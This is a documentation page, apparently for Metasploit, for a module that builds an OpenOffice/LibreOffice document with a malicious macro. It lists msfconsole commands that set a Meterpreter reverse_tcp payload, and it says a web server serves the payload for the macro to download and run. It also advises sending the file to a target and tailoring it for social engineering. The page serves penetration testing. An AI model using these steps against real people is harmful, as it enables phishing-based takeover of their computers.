{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/multi/misc/openoffice_document_macro","result":{"data":{"moduleMetadataJson":{"id":"25a989ba-c582-5ce2-aed8-2497949bea34","name":"Apache OpenOffice Text Document Malicious Macro Execution","fullname":"exploit/multi/misc/openoffice_document_macro","description":"This module generates an Apache OpenOffice Text Document with a malicious macro in it.\n        To exploit successfully, the targeted user must adjust the security level in Macro\n        Security to either Medium or Low. If set to Medium, a prompt is presented to the user\n        to enable or disable the macro. If set to Low, the macro can automatically run without\n        any warning.\n\n        The module also works against LibreOffice.","rank":600,"fields":{"detailsSlug":"/modules/details/exploit/multi/misc/openoffice_document_macro","documentationSlug":"/modules/documentation/exploit/multi/misc/openoffice_document_macro","referencesSlug":"/modules/references/exploit/multi/misc/openoffice_document_macro"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>This module generates an Apache OpenOffice Text Document with a malicious macro in it. It also\nworks against LibreOffice.</p>\n<p>To exploit successfully, the targeted user must adjust the security level in Macro Security to\neither Medium or Low. If set to Medium, a prompt is presented to the user to enable or disable the\nmacro. If set to Low, the macro can automatically run without any warning.</p>\n<ul>\n<li>Apache OpenOffice</li>\n<li>LibreOffice</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<p>To use this exploit, you must know the platform of the targeted user. The module supports Windows,\nLinux, and OSX. If the target is using Windows, then the exploit will generate the macro\nwith malicious Powershell code inside. For other supported platforms, the exploit will generate\nPython code.</p>\n<p>An example of using this module against Windows:</p>\n<ol>\n<li>Start msfconsole</li>\n<li><code class=\"language-text\">use exploit/multi/misc/openoffice_document_macro</code></li>\n<li><code class=\"language-text\">set target 0</code></li>\n<li><code class=\"language-text\">set payload windows/meterpreter/reverse_tcp</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n</ol>\n<p>An example of using this module against Linux or OSX:</p>\n<ol>\n<li>Start msfconsole</li>\n<li><code class=\"language-text\">use exploit/multi/misc/openoffice_document_macro</code></li>\n<li><code class=\"language-text\">set target 1</code></li>\n<li><code class=\"language-text\">set payload python/meterpreter/reverse_tcp</code></li>\n<li><code class=\"language-text\">exploit</code></li>\n</ol>\n<p>Once started, the module will mainly do these things:</p>\n<ol>\n<li>It will start a payload handler.</li>\n<li>It will start a web server. This is used for the macro to download and execute our final payload.</li>\n<li>The malicious odt file. Send this to your targeted user.</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>BODY</strong></p>\n<p>This option can be used to insert text to the malicious document.</p>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<p><img src=\"https://cloud.githubusercontent.com/assets/1170914/22761020/9e7667ca-ee1e-11e6-9fc1-a29c55f405f0.gif\" alt=\"openoffice_macro_demo\"></p>\n<h3 id=\"modification\" style=\"position:relative;\"><a href=\"#modification\" aria-label=\"modification permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Modification</h3>\n<p>Since social engineering will play a big part in the success of the attack, you will most likely\nwant to modify the odt file.</p>\n<ol>\n<li>To do so, first use msfconsole to generate the malicious odt file.</li>\n<li>Move the odt file to a system that has OpenOffice or LibreOffice</li>\n<li>You can just use OpenOffice/LibreOffice to edit the file. Make sure you don't modify the macro\ncode unless you actually know what you're doing.</li>\n</ol>"}}},"pageContext":{"id":"25a989ba-c582-5ce2-aed8-2497949bea34"}}}